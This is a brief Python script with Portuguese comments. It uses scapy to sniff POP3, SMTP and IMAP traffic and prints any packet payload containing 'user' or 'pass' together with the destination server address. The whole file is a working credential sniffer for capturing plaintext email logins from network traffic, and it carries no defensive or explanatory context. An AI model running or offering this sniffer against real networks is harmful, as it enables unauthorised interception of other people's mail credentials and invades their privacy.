# -*- coding: utf-8 -*-
from scapy.all import *

# nossa callback para os pacotes
def packet_callback(packet):
    #print( packet.show() )
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print('[*] Server: %s'%(packet[IP].dst))
            print('[*] %s'%(packet[TCP].payload))


#dispara o nosso sniffer
#sniff(prn=packet_callback, count=1)
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
